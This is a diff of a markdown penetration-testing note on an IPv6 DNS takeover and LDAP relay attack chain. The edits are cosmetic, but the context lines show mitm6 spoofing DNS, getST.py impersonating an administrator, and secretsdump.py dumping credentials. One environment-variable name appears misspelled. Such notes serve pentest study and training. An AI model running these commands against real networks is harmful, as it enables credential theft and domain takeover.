@@ -1,4 +1,4 @@
-# DNS Takeover / LDAP Relay
+# ⭕ DNS Takeover + LDAP Relay
 
 ## IPv6 DNS Takeover
 
@@ -14,7 +14,7 @@ we run mitm6 on the domain use -i to specify the interface.
 python mitm6.py -i vboxnet0 -d megacorp.local
 ```
 
-&#x20;leave the terminal open, for now we are playing the role of an IPv6 DNS server in the network.
+leave the terminal open, for now we are playing the role of an IPv6 DNS server in the network.
 
 ## LDAP Relay
 
@@ -58,8 +58,3 @@ getST.py -spn cifs/icorp-w10.internal.corp internal.corp/RDPOF\$ -impersonate ad
 export KRBCCNAME=admin.ccache
 secretsdump.py -k -no-pass icorp-w10.internal.corp
 ```
-
-
-
-
-
